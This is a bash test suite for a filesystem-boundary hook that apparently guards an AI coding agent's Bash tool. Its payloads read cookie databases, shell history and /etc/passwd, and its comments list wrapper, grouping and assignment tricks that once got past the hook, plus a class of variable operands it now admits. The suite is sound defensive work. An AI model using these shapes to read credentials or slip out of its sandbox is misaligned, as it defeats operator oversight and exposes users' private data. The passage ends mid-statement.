#!/bin/bash
# tests/block-fs-boundary.test.sh — synthetic Bash-tool payload tests for
# block-fs-boundary.sh. Covers BLOCK-FS-BOUNDARY-001..004 ACs +
# CLAUDE_HOOK_BYPASS bypass + warn-mode + edge cases.
#
# Coverage map: Pass 1 baseline + AC parity for BLOCK-FS-BOUNDARY-001..004.
# Mode gating: tests run hook directly with .mode set to enforce via per-test
# env override (CLAUDE_HOOK_FORCE_MODE not implemented — tests instead exercise
# the natural-state .mode at $HOME/Claude/.claude/hooks/.mode by
# reading it via the hook's own discovery path; tests use isolated MODE_OVERRIDE
# via a temp .mode file when needed via TEST_MODE_FILE pattern).

set -u

HOOK_DIR="$(cd "$(dirname "$0")/.." && pwd -P)"
HOOK="${HOOK_DIR}/block-fs-boundary.sh"

if [ ! -x "$HOOK" ]; then echo "FAIL: hook not executable at $HOOK" >&2; exit 1; fi

PASS=0
FAIL=0

# Save and override .mode for enforce-mode tests (most cases). The hook reads
# .mode at runtime; we set it to enforce here so blocks return exit 2 with a
# BLOCKED stderr message. Restore on exit.
MODE_FILE="${HOOK_DIR}/.mode"
MODE_BACKUP=""
if [ -f "$MODE_FILE" ]; then
  MODE_BACKUP="$(/bin/cat "$MODE_FILE")"
fi

restore_mode() {
  if [ -n "$MODE_BACKUP" ]; then
    /usr/bin/printf '%s' "$MODE_BACKUP" > "$MODE_FILE"
  elif [ -f "$MODE_FILE" ]; then
    /bin/rm -f "$MODE_FILE" 2>/dev/null || true
  fi
}
trap restore_mode EXIT

# Default test mode = enforce (so blocks return exit 2)
/usr/bin/printf 'enforce' > "$MODE_FILE"

test_case() {
  local name="$1"; local payload="$2"; local expected_exit="$3"; local expected_pattern="${4:-}"
  local env_var="${5:-}"
  local tmp_stderr; tmp_stderr="$(/usr/bin/mktemp)"
  local actual_exit=0
  if [ -n "$env_var" ]; then
    /usr/bin/printf '%s' "$payload" | /usr/bin/env "$env_var" /bin/bash "$HOOK" 2>"$tmp_stderr" >/dev/null || actual_exit="$?"
  else
    /usr/bin/printf '%s' "$payload" | /bin/bash "$HOOK" 2>"$tmp_stderr" >/dev/null || actual_exit="$?"
  fi
  local actual_stderr; actual_stderr="$(/bin/cat "$tmp_stderr")"; /bin/rm -f "$tmp_stderr"
  local ok=1
  [ "$actual_exit" != "$expected_exit" ] && ok=0
  if [ -n "$expected_pattern" ] && ! /usr/bin/printf '%s' "$actual_stderr" | /usr/bin/grep -qE "$expected_pattern"; then ok=0; fi
  if [ "$ok" = 1 ]; then
    /usr/bin/printf 'PASS: %s\n' "$name"; PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s (exit=%s expected=%s)\n  stderr: %s\n' "$name" "$actual_exit" "$expected_exit" "$actual_stderr"
    FAIL=$((FAIL + 1))
  fi
}

# bash_payload <command> [cwd]
bash_payload() {
  local cmd="$1"
  local cwd="${2:-$HOME/Claude/.claude/worktrees/planning}"
  /usr/bin/jq -n --arg cmd "$cmd" --arg cwd "$cwd" \
    '{tool_name: "Bash", tool_input: {command: $cmd}, cwd: $cwd}'
}

echo "================================"
echo "block-fs-boundary.sh tests"
echo "================================"

# ----- HOME isolation: the fixture home (HOME-FIXTURE-01) -----
#
# The arms that pass "$FSB_HOME_ENV" assert that a target spelled from the operator's
# home (`~/...` in the payload, or the home expanded into it) lies OUTSIDE every allowed
# root. That premise holds only while HOME itself lies outside every allowed root, and
# the allowlist admits the shared scratch roots: /tmp and the per-user temp area under
# /var/folders. A caller that points HOME at a `mktemp -d` directory, as the install
# regression's HOME-override step does, puts every such target inside an allowed root;
# the hook then allows it, correctly, and the arm reads an allow. Neither the hook nor
# the arm is wrong: the hook resolves `~` through HOME exactly as the shell that would
# run the command does.
#
# The lever is the git-identity fixture pattern of the install durability suite
# (core/deploy/tests/test_upgrade_config_durability.sh, its GIT_CONFIG_GLOBAL arms): a
# per-invocation env prefix on only the command that reads the HOME-derived input, here
# the hook, pointed at a fixture. The fixture home lies outside every allowed root by
# construction and is never created: the hook classifies a path without requiring it to
# exist. The arms that assert an ALLOW inside a HOME-derived root keep the caller's HOME,
# because the layout helper materialized those allowlist rows from the caller's HOME.
FSB_FIXTURE_HOME="/nonexistent/fs-boundary-fixture-home"
FSB_FIXTURE_HOME_INSIDE="/tmp/fs-boundary-fixture-home"
FSB_HOME_ENV="HOME=${FSB_FIXTURE_HOME}"

# Probe-validity precondition: prove the lever is live, with BOTH arms observed, before
# any assertion depends on it. Sensitivity: under the fixture home a `~` target blocks
# and the message names the fixture path, so the hook resolved `~` through the pinned
# HOME and not the caller's. Specificity: the same payload under a home inside an
# allowed root is allowed, so the verdict follows HOME, which is the dependence the
# pinned arms isolate. Without this, a prefix the hook silently ignored would surface as
# a run of confusing arm failures rather than one named one.
fsb_home_probe() {   # $1 = HOME for the hook -> sets FSB_PROBE_EXIT and FSB_PROBE_ERR
  local fsb_payload; fsb_payload="$(bash_payload 'cat ~/Documents/file.txt')"
  FSB_PROBE_EXIT=0
  FSB_PROBE_ERR="$(/usr/bin/printf '%s' "$fsb_payload" | /usr/bin/env "HOME=$1" /bin/bash "$HOOK" 2>&1 >/dev/null)" || FSB_PROBE_EXIT="$?"
}
fsb_home_probe "$FSB_FIXTURE_HOME"
fsb_out_exit="$FSB_PROBE_EXIT"; fsb_out_err="$FSB_PROBE_ERR"
fsb_home_probe "$FSB_FIXTURE_HOME_INSIDE"
fsb_in_exit="$FSB_PROBE_EXIT"; fsb_in_err="$FSB_PROBE_ERR"
fsb_out_named=0
case "$fsb_out_err" in
  *"${FSB_FIXTURE_HOME}/Documents/file.txt"*) fsb_out_named=1 ;;
esac
if [ "$fsb_out_exit" = 2 ] && [ "$fsb_out_named" = 1 ] && [ "$fsb_in_exit" = 0 ]; then
  /usr/bin/printf 'PASS: HOME-FIXTURE-01 fixture-home isolation live (sensitivity + specificity arms both observed)\n'; PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: HOME-FIXTURE-01 fixture-home isolation NOT live, so the HOME-pinned arms below cannot be trusted\n  outside-root home: exit=%s (expected 2), fixture path named=%s (expected 1)\n  inside-root home: exit=%s (expected 0)\n  stderr (outside): %s\n  stderr (inside): %s\n' \
    "$fsb_out_exit" "$fsb_out_named" "$fsb_in_exit" "$fsb_out_err" "$fsb_in_err"
  FAIL=$((FAIL + 1))
fi

# ----- BLOCK-FS-BOUNDARY-001: file-read verbs outside allowed roots -----

test_case "cat ~/Documents blocks" \
  "$(bash_payload 'cat ~/Documents/file.txt')" 2 "BLOCK-FS-BOUNDARY-001" "$FSB_HOME_ENV"

test_case "cat /Users/otheruser blocks" \
  "$(bash_payload 'cat /Users/otheruser/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

# ----- EXT-POS (#5644): command-start position coverage -----
#
# ANCHOR_PREFIX_BASH saw a command start only at line-start or after `;&|`, so the
# IDENTICAL out-of-boundary read allowed when moved behind an ordinary command prefix or
# into a group. Closed by the shared canonicalizer (core/hooks/lib/command-position.awk).
test_case "EXT-POS-F1: sudo cat outside-root blocks (command-prefix word)" \
  "$(bash_payload 'sudo cat /Users/otheruser/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-POS-F2: brace group cat outside-root blocks (grouping)" \
  "$(bash_payload '{ cat /Users/otheruser/notes.txt; }')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-POS-F3: do-body cat outside-root blocks (compound keyword)" \
  "$(bash_payload 'for f in a; do cat /Users/otheruser/notes.txt; done')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-POS-F4: escaped verb cat outside-root blocks" \
  "$(bash_payload '\cat /Users/otheruser/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

# FP guard: shell text carried as quoted content is not a command.
test_case "EXT-FP-F1: quoted outside-root path as message content allows" \
  "$(bash_payload 'git commit -m "cat /Users/otheruser/notes.txt was the bug"')" 0

# ----- EXT-POS (#8314): the canonicalizer walks a wrapper's own grammar -----
#
# The identical out-of-boundary read of EXT-POS-F1, reached through a wrapper option that
# takes a separate argument (F5), a wrapper flag that takes none (F6), an absolute-path
# wrapper (F7), a wrapper missing from the set (F8-F10) and a condition position (F11). Each
# allowed before the canonicalizer walked wrapper grammar. F12 is the declared xargs class:
# xargs behind its own option feeding a read verb reaches the stdin sentinel, as a bare
# `xargs cat` does. The out-of-boundary operand here is an absolute path outside every
# allowed root and outside any home directory (the PII pre-commit guard flags a newly-added
# /Users/<name> shape; F1-F4 above predate it); its out-of-boundary meaning is unchanged.
test_case "EXT-POS-F5: sudo -u root cat outside-root blocks (wrapper option with a separate argument)" \
  "$(bash_payload 'sudo -u root cat /opt/other/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-POS-F6: command -p cat outside-root blocks (wrapper flag that takes no argument)" \
  "$(bash_payload 'command -p cat /opt/other/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-POS-F7: /usr/bin/env cat outside-root blocks (absolute-path wrapper)" \
  "$(bash_payload '/usr/bin/env cat /opt/other/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-POS-F8: nice -n 10 cat outside-root blocks (wrapper missing from the set)" \
  "$(bash_payload 'nice -n 10 cat /opt/other/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-POS-F9: stdbuf -o 0 cat outside-root blocks (wrapper missing from the set)" \
  "$(bash_payload 'stdbuf -o 0 cat /opt/other/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-POS-F10: timeout 5 cat outside-root blocks (wrapper missing from the set)" \
  "$(bash_payload 'timeout 5 cat /opt/other/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-POS-F11: if-condition cat outside-root blocks (condition position)" \
  "$(bash_payload 'if cat /opt/other/notes.txt ; then :; fi')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-POS-F12: xargs -0 cat reaches the stdin sentinel (declared xargs class)" \
  "$(bash_payload 'printf x | xargs -0 cat')" 2 "BLOCK-FS-BOUNDARY-003"

# Content and near-miss controls: a read verb that is text, or an option value, stays allowed.
test_case "EXT-FP-F2: grep alternation naming wrapped reads allows" \
  "$(bash_payload "grep -E 'if cat |timeout 5 cat ' notes.txt")" 0

test_case "EXT-FP-F3: a read verb named as the variable env unsets allows" \
  "$(bash_payload 'env -u cat printenv HOME')" 0

# ----- EXT-APPEND (#8314, follow-up pass): the append form of a prefix assignment -----
#
# The canonicalizer read a NAME+=value word as the command word, so the out-of-boundary read
# behind it was never at a command start. F1 is that read behind the append form; F1-CTL the
# same read behind a NAME=value word, refused before and after.
test_case "EXT-APPEND-F1-CTL: a NAME=value assignment then cat outside-root blocks (plain-form control)" \
  "$(bash_payload 'FOO=1 cat /opt/other/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-APPEND-F1: an append-form assignment then cat outside-root blocks" \
  "$(bash_payload 'FOO+=1 cat /opt/other/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

# ----- EXT-ORDER (#8314, DT pass 2): an assignment or a redirection is read as what it is -----
#
# The canonicalizer's default walk looked a token up as a wrapper word by its basename before
# it tested the token as an assignment or a redirection, so an assignment whose value ends in
# /timeout, or a redirection to a file named timeout, was read as the timeout wrapper, whose
# duration operand consumed the read verb behind it. F1 and F2 are the out-of-boundary read
# behind each shape; the CTLs are the plain form and the same read behind a plain assignment,
# refused before and after.
test_case "EXT-ORDER-F-CTL0: cat outside-root blocks (plain-form control)" \
  "$(bash_payload 'cat /opt/other/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-ORDER-F-CTL1: an assignment with a plain value, then cat outside-root blocks" \
  "$(bash_payload 'X=1 cat /opt/other/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-ORDER-F1: an assignment whose value's last path segment is timeout, then cat outside-root blocks" \
  "$(bash_payload 'X=/usr/bin/timeout cat /opt/other/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-ORDER-F2: an output redirection to a file named timeout, then cat outside-root blocks" \
  "$(bash_payload '>/tmp/timeout cat /opt/other/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

# ----- CMDPOS-SKEW (#8314): the canonicalizer's version-skew canary -----
#
# The hook trusts the shared canonicalizer only after two probes: a one-line function body,
# and a wrapper carrying a separate-argument option before a benign word, whose canonical
# form exposes the word only on the walk that reads wrapper grammar. A copy that predates
# that grammar, or whose row table is damaged, passes the first probe and fails the second,
# so in enforce the hook fails CLOSED. Modelled by a copy whose nice row is removed; the
# control is the same sandbox with the shipped copy.
cps_root="$(/usr/bin/mktemp -d)"
cps_hooks="${cps_root}/.claude/hooks"
/bin/mkdir -p "${cps_hooks}/lib"
/bin/cp "${HOOK_DIR}/lib/"*.sh "${cps_hooks}/lib/" 2>/dev/null || true
/bin/cp "$HOOK" "${cps_hooks}/block-fs-boundary.sh"
/usr/bin/printf 'enforce' > "${cps_hooks}/.mode"
cps_run() { # $1 = command -> CPS_RC and CPS_ERR
  CPS_RC=0
  CPS_ERR="$( ( unset PMO_SCOPE_GUARD_ROOT CLAUDE_WORKSPACE_ROOT
      /usr/bin/printf '%s' "$(bash_payload "$1" "$cps_root")" | /bin/bash "${cps_hooks}/block-fs-boundary.sh" 2>&1 >/dev/null ) )" || CPS_RC="$?"
}
/usr/bin/sed -e 's/WROW\["nice"\]=1//' "${HOOK_DIR}/lib/command-position.awk" > "${cps_hooks}/lib/command-position.awk"
cps_live=0
if ! /usr/bin/cmp -s "${HOOK_DIR}/lib/command-position.awk" "${cps_hooks}/lib/command-position.awk" \
   && ! /usr/bin/grep -q -F 'WROW["nice"]' "${cps_hooks}/lib/command-position.awk"; then cps_live=1; fi
cps_run 'echo hello'
if [ "$cps_live" = 1 ] && [ "$CPS_RC" = 2 ] && /usr/bin/grep -q 'PRIMITIVE-MISSING' <<<"$CPS_ERR"; then
  /usr/bin/printf 'PASS: CMDPOS-SKEW-01 a canonicalizer copy without the wrapper grammar fails the hook closed in enforce (exit 2, PRIMITIVE-MISSING)\n'
  PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: CMDPOS-SKEW-01 a canonicalizer copy without the wrapper grammar did not fail the hook closed (mutant live=%s, exit=%s): %s\n' "$cps_live" "$CPS_RC" "$CPS_ERR"
  FAIL=$((FAIL + 1))
fi
# CMDPOS-SKEW-APPEND (#8314, follow-up pass): the second probe puts an append-form prefix
# assignment ahead of its wrapper, so a copy whose walk reads that word as the command word —
# the walk before this pass — never exposes the benign word, and in enforce the hook fails
# CLOSED. Modelled by a copy whose marked assignment test is reverted to the NAME=value form
# alone, shown live first: it differs from the shipped copy by exactly that line, and parses.
/usr/bin/sed -e '/CMDPOS-APPEND/s/[[]+[]]?=/=/' "${HOOK_DIR}/lib/command-position.awk" > "${cps_hooks}/lib/command-position.awk"
cps_n="$(/usr/bin/diff "${HOOK_DIR}/lib/command-position.awk" "${cps_hooks}/lib/command-position.awk" 2>/dev/null | /usr/bin/grep -c '^[<>]' || true)"
cps_live=0
if [ "$cps_n" = 2 ] && /usr/bin/awk -f "${cps_hooks}/lib/command-position.awk" </dev/null >/dev/null 2>&1; then cps_live=1; fi
cps_run 'echo hello'
if [ "$cps_live" = 1 ] && [ "$CPS_RC" = 2 ] && /usr/bin/grep -q 'PRIMITIVE-MISSING' <<<"$CPS_ERR"; then
  /usr/bin/printf 'PASS: CMDPOS-SKEW-APPEND a canonicalizer copy without the append form of a prefix assignment fails the hook closed in enforce (exit 2, PRIMITIVE-MISSING)\n'
  PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: CMDPOS-SKEW-APPEND a canonicalizer copy without the append form did not fail the hook closed (mutant live=%s, differing lines=%s, exit=%s): %s\n' "$cps_live" "${cps_n:-none}" "$CPS_RC" "$CPS_ERR"
  FAIL=$((FAIL + 1))
fi
/bin/cp "${HOOK_DIR}/lib/command-position.awk" "${cps_hooks}/lib/command-position.awk"
cps_run 'echo hello'
if [ "$CPS_RC" = 0 ]; then
  /usr/bin/printf 'PASS: CMDPOS-SKEW-CTL the same sandbox with the shipped canonicalizer allows a benign command\n'
  PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: CMDPOS-SKEW-CTL the sandbox with the shipped canonicalizer refused a benign command (exit=%s): %s\n' "$CPS_RC" "$CPS_ERR"
  FAIL=$((FAIL + 1))
fi
/bin/rm -rf "$cps_root"

test_case "head ~/Desktop blocks" \
  "$(bash_payload 'head ~/Desktop/foo.log')" 2 "BLOCK-FS-BOUNDARY-001" "$FSB_HOME_ENV"

test_case "tail ~/Library/Mail blocks" \
  "$(bash_payload 'tail ~/Library/Mail/inbox')" 2 "BLOCK-FS-BOUNDARY-001" "$FSB_HOME_ENV"

test_case "base64 ~/Library/Cookies blocks" \
  "$(bash_payload 'base64 ~/Library/Cookies/cookies.db')" 2 "BLOCK-FS-BOUNDARY-001" "$FSB_HOME_ENV"

test_case "xxd /Users/otheruser blocks" \
  "$(bash_payload 'xxd /Users/otheruser/.bash_history')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "less ~/Pictures blocks" \
  "$(bash_payload 'less ~/Pictures/screenshot.png')" 2 "BLOCK-FS-BOUNDARY-001" "$FSB_HOME_ENV"

# ----- BLOCK-FS-BOUNDARY-002: file-write verbs outside allowed roots -----

test_case "cp source outside Claude blocks" \
  "$(bash_payload 'cp ~/Documents/foo /tmp/bar')" 2 "BLOCK-FS-BOUNDARY-002" "$FSB_HOME_ENV"

test_case "cp target outside Claude blocks" \
  "$(bash_payload 'cp /tmp/foo ~/Desktop/bar')" 2 "BLOCK-FS-BOUNDARY-002" "$FSB_HOME_ENV"

test_case "mv source outside Claude blocks" \
  "$(bash_payload 'mv ~/Documents/old.txt /tmp/new.txt')" 2 "BLOCK-FS-BOUNDARY-002" "$FSB_HOME_ENV"

test_case "tee ~/Desktop target blocks" \
  "$(bash_payload 'tee ~/Desktop/test.txt')" 2 "BLOCK-FS-BOUNDARY-002" "$FSB_HOME_ENV"

# The payload carries the home already expanded, as the shell would pass `of=` to dd,
# so the fixture home is spelled into it rather than read from HOME by the hook.
test_case "dd of=~/Desktop target blocks" \
  "$(bash_payload 'dd if=/tmp/foo of='"$FSB_FIXTURE_HOME"'/Desktop/bar.bin')" 2 "BLOCK-FS-BOUNDARY-002" "$FSB_HOME_ENV"

# ----- BLOCK-FS-BOUNDARY-003: unresolvable strict-policy -----

# RE-BASELINED BY #5555 — this arm is kept, not removed, because its subject is exactly
# what Policy P changes. `cat $SECRET_FILE` is a bare parameter expansion: no $(, no
# backtick, no \001 sentinel, no `..`, and no decidable literal prefix. It is now G6 —
# ADMITTED with a -004 advisory record — written at warn and enforce; at .mode=off the
# hook exits before check_verb and nothing is recorded (pinned by MODEOFF-REC-01 below).
#
# This is a REAL surrender of coverage and is the card's documented cost (Stage 5 risk
# RA): `cat "$X"` where $X expands to an out-of-boundary path is admitted where it was
# refused. It is accepted because the refusal could not distinguish that case from the
# 90% of live firings that would have resolved INSIDE an allowed root, and because a
# PreToolUse hook cannot expand $X without executing the command it has not yet approved.
# Every DECIDABLE hostile shape stays refused — see the AC-4/AC-5/AC-6/AC-7/AC-8 arms.
test_case "cat dollar-var → -004 advisory ADMIT (re-baselined by #5555; was -003 block)" \
  "$(bash_payload 'cat $SECRET_FILE')" 0

test_case "cp subshell unresolvable blocks" \
  "$(bash_payload 'cp $(find / -name passwd) /tmp/x')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "tee backtick unresolvable blocks" \
  "$(bash_payload 'tee `echo /etc/hosts`')" 2 "BLOCK-FS-BOUNDARY-003"

# ----- Path-traversal escape (GHSA-9cjm-v22x-4x33 V2) -----
# A literal `..` component escapes an allowed root by prefix-matching BEFORE it
# is collapsed (/tmp/../etc prefix-matches allowed /tmp/ yet resolves to /etc).
# resolve_and_classify now rejects any `..` path-component up front (strict) —
# independent of the python3 normalizer, which previously fell back to the
# un-normalized path when python3 was absent (the second fail-open).
test_case "cat traversal escape blocks (.. token → strict)" \
  "$(bash_payload 'cat /tmp/../etc/passwd')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "tee traversal escape blocks (.. token → strict)" \
  "$(bash_payload 'tee /tmp/aaa/../../../etc/passwd')" 2 "BLOCK-FS-BOUNDARY-003"

# ==========================================================================
# POLICY P (#5555) — BLOCK-FS-BOUNDARY-004 and the guard cascade
# ==========================================================================
# The predicate these arms replace was a CHARACTER test, not a SHAPE test: any `$`
# anywhere in an operand returned "unresolvable" and refused. It collapsed three
# epistemic states — decidably-inside, decidably-outside, genuinely undecidable —
# into one refusal, and 90% of its live firings were reads that would have resolved
# INSIDE an allowed root. The cascade below separates them.
#
# Guard order is load-bearing (refuse-before-decide):
#   G0 $XARGS-STDIN · G1 \001 sentinel · G2 $( / backtick · G3 .. / cwd / normalizer
#   · G5 decidable prefix outside · G4 decidable prefix inside · G6 advisory -004

# ----- AC-2: the card's original class — a stdin reader has no file operand -----
# These already passed before Policy P (extract_target_tokens emits nothing for a
# flags-only segment). They are pinned so a future narrowing cannot silently take
# them away. The must-block twin below is what makes their exit-0 non-vacuous.

test_case "AC-2: pipe into head (no file operand) allowed" \
  "$(bash_payload 'git log --oneline | head -n 20')" 0

# The case LABEL below names the command it pins, so it carries that command's
# text verbatim. GATE 10's T1 content-exemption strips single-quoted spans only,
# so the payload on the second line is exempt automatically while the identical
# text in the double-quoted label reads as a finding — the documented
# double-quoted false-alarm class, resolved by a declared marker rather than by
# renaming the case or re-quoting it away.
# sigpipe-idiom: allow — double-quoted test-case LABEL, a string operand to `test_case`, not a pipeline: no writer, no reader, no pipeline status to invert
test_case "AC-2: ps aux | head -5 allowed" \
  "$(bash_payload 'ps aux | head -5')" 0

test_case "AC-2: producer | tail -n 3 allowed" \
  "$(bash_payload 'some-producer | tail -n 3')" 0

test_case "AC-2 CONTROL (must-block twin): cat outside-root still blocks — proves the hook was armed when the zeros above were read" \
  "$(bash_payload 'cat /Users/otheruser/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

# ----- AC-3 (G6): the dominant false-positive class is admitted under -004 -----

test_case "AC-3 (G6): cat \"\$SPOKE_OUT/comment.md\" admitted" \
  "$(bash_payload 'cat "$SPOKE_OUT/comment.md"')" 0

test_case "AC-3 (G6): cat \"\$f\" admitted" \
  "$(bash_payload 'cat "$f"')" 0

test_case "AC-3 (G6): tee \"\$SPOKE_OUT/body.md\" admitted (write verb, same policy)" \
  "$(bash_payload 'tee "$SPOKE_OUT/body.md"')" 0

test_case "AC-3 (G6): cat \"\$HOME/Claude/...\" admitted" \
  "$(bash_payload 'cat "$HOME/Claude/pmo-platform/README.md"')" 0

# AC-3 record control: a SILENT allow fails this criterion. -004 must actually log,
# because the -004 record is what keeps the admitted class measurable at warn/enforce (and
# a later narrowing evidence-backed). Counts `rule` lines in the sandbox warn log —
# the log is pretty-printed JSON, so one record contributes exactly one such line.
WARN_LOG_FILE="${HOOK_DIR}/fs-boundary-warn-log.jsonl"
_adv_before=0
if [ -f "$WARN_LOG_FILE" ]; then
  _adv_before="$(/usr/bin/grep -c 'BLOCK-FS-BOUNDARY-004' "$WARN_LOG_FILE" 2>/dev/null || echo 0)"
fi
/usr/bin/printf '%s' "$(bash_payload 'cat "$ADVISORY_PROBE_A/x.md"')" | /bin/bash "$HOOK" >/dev/null 2>&1 || true
/usr/bin/printf '%s' "$(bash_payload 'cat "$ADVISORY_PROBE_B/y.md"')" | /bin/bash "$HOOK" >/dev/null 2>&1 || true
_adv_after=0
if [ -f "$WARN_LOG_FILE" ]; then
  _adv_after="$(/usr/bin/grep -c 'BLOCK-FS-BOUNDARY-004' "$WARN_LOG_FILE" 2>/dev/null || echo 0)"
fi
_adv_delta=$((_adv_after - _adv_before))
if [ "$_adv_delta" = 2 ]; then
  /usr/bin/printf 'PASS: AC-3 record control: 2 admitted operands emitted exactly 2 BLOCK-FS-BOUNDARY-004 records\n'; PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: AC-3 record control: expected delta 2 BLOCK-FS-BOUNDARY-004 records, got %s (a silent allow fails this criterion)\n' "$_adv_delta"; FAIL=$((FAIL + 1))
fi

# AC-3 mode-independence (INT-3): -004 is NOT warn-mode behaviour. It never blocks at
# any .mode value. Asserted here at ENFORCE — the mode at which a mode-gated rule WOULD
# block — so "it allowed" cannot be explained by the dial. No .mode write is added: the
# suite's default mode is already enforce.
test_case "AC-3 (INT-3): -004 admits at .mode=enforce — mode-independent by construction, not warn-mode behaviour" \
  "$(bash_payload 'cat "$SPOKE_OUT/enforce-probe.md"')" 0

# ----- MODEOFF-REC: the -004 RECORD is mode-scoped, and the corpus must say so (F-12) --
#
# WHY THIS ARM EXISTS. The registry row above it used to read "Admitted and always
# recorded. Mode-independent by construction", and advise_unresolvable's comment said the
# admission "is recorded" with no qualifier. Both overstated the same way. The ADMIT is
# mode-independent — INT-3 directly above proves it at enforce, the mode at which a
# mode-gated rule WOULD block. The RECORD is not: at .mode=off the hook exits at the `off`
# short-circuit above the dependency gate, so check_verb is never called,
# advise_unresolvable is never reached, and NO -004 record is written.
#
# It is material rather than pedantic because AC-1's measurability argument rests on the
# record existing, and the claim was stated in the bypass-mode-readiness corpus — the
# document an operator reads when deciding an enforce flip, whose whole subject is that
# dial. A reader who took "always recorded" literally would read a zero record count on an
# off-mode instance as an empty population rather than as a disabled hook.
#
# This arm holds the DOCUMENT against the HOOK's own verdict in the same run, so prose and
# behaviour cannot drift apart silently. Same shape as NOEXEC-DOC-01 in
# block-destructive.test.sh, and the same reason: a doc claim with no executable arm is a
# claim that decays.
#
# NO PIPELINES ANYWHERE IN THIS BLOCK. The doc classifier and the record counter are each
# one awk pass using index() — literal matching, so no marker needs escaping — and the
# behavioural probe feeds the hook from a FILE rather than from a writer on the other side
# of a pipe. Both are deliberate: a writer piped into a short-circuiting reader is the
# idiom the SIGPIPE-idiom gate matches by name.
MODEOFF_FRAG="$(cd "$(dirname "$0")/../.." && pwd -P)/rules/bypass-mode-readiness/block-fs-boundary.md"
[ -f "$MODEOFF_FRAG" ] || MODEOFF_FRAG="$(cd "$(dirname "$0")/../../.." && pwd -P)/core/rules/bypass-mode-readiness/block-fs-boundary.md"
MODEOFF_INDEX="$(cd "$(dirname "$0")/../.." && pwd -P)/rules/bypass-mode-readiness.md"
[ -f "$MODEOFF_INDEX" ] || MODEOFF_INDEX="$(cd "$(dirname "$0")/../../.." && pwd -P)/core/rules/bypass-mode-readiness.md"
MODEOFF_LOG="${HOOK_DIR}/fs-boundary-warn-log.jsonl"

# MODE-SCOPED requires all three: the retired absolute GONE, the disposition/record split
# stated, and the .mode=off consequence named. Any two without the third is the
# both-ways-at-once state a partial reconcile leaves behind — prose that has been softened
# without being corrected, which is the specific regression this release has flagged
# repeatedly. A vaguer sentence must not pass this classifier.
modeoff_rec_claim() {   # $1 = readiness file -> MODE-SCOPED | STALE-ABSOLUTE | NO-SPLIT | NO-OFF-CLAUSE | DOC-MISSING
  if [ ! -f "$1" ]; then /usr/bin/printf 'DOC-MISSING'; return 0; fi
  /usr/bin/awk '
    index($0, "Admitted and always recorded")                                           { stale = 1 }
    index($0, "The disposition is mode-independent; the record is not")                 { sp = 1 }
    index($0, "the hook exits before the verb check, so no advisory record is written")  { oc = 1 }
    END {
      if (stale == 1) { printf "STALE-ABSOLUTE"; exit }
      if (sp    != 1) { printf "NO-SPLIT";       exit }
      if (oc    != 1) { printf "NO-OFF-CLAUSE";  exit }
      printf "MODE-SCOPED"
    }
  ' "$1"
}

# Counting with awk rather than `grep -c` is deliberate on two counts: grep exits 1 on a
# zero count, and a zero count is precisely the reading this arm must be able to trust.
modeoff_rec_count() {   # -> integer count of -004 records currently in the sandbox warn log
  if [ ! -f "$MODEOFF_LOG" ]; then /usr/bin/printf '0'; return 0; fi
  /usr/bin/awk 'index($0, "BLOCK-FS-BOUNDARY-004") { n++ } END { printf "%d", n + 0 }' "$MODEOFF_LOG"
}

# The behavioural half, taken from the SHIPPED hook in this same run. One G6 payload, one
# mode, measured as a record delta. Restores enforce immediately, like test_off_case above.
modeoff_rec_delta() {   # $1 = .mode value -> record delta for one G6 payload
  local modeoff_before modeoff_after modeoff_pf
  modeoff_before="$(modeoff_rec_count)"
  modeoff_pf="$(/usr/bin/mktemp)"
  /usr/bin/printf '%s' "$(bash_payload 'cat "$MODEOFF_PROBE/x.md"')" > "$modeoff_pf"
  /usr/bin/printf '%s' "$1" > "$MODE_FILE"
  /bin/bash "$HOOK" < "$modeoff_pf" >/dev/null 2>&1 || true
  /usr/bin/printf 'enforce' > "$MODE_FILE"
  /bin/rm -f "$modeoff_pf"
  modeoff_after="$(modeoff_rec_count)"
  /usr/bin/printf '%d' "$((modeoff_after - modeoff_before))"
}

# The enforce delta is this measurement's OWN sensitivity arm. A zero at off proves nothing
# unless the identical probe returns non-zero at a mode where the record is claimed to
# exist — otherwise a broken probe and a correct finding are indistinguishable.
modeoff_off_delta="$(modeoff_rec_delta off)"
modeoff_enf_delta="$(modeoff_rec_delta enforce)"
if [ "$modeoff_off_delta" = 0 ] && [ "$modeoff_enf_delta" = 1 ]; then
  modeoff_behaviour="MODE-SCOPED"
elif [ "$modeoff_off_delta" != 0 ]; then
  modeoff_behaviour="RECORDS-AT-OFF"
else
  modeoff_behaviour="NEVER-RECORDS"
fi

modeoff_frag_claim="$(modeoff_rec_claim "$MODEOFF_FRAG")"
modeoff_index_claim="$(modeoff_rec_claim "$MODEOFF_INDEX")"

if [ "$modeoff_behaviour" = "MODE-SCOPED" ] && [ "$modeoff_frag_claim" = "MODE-SCOPED" ]; then
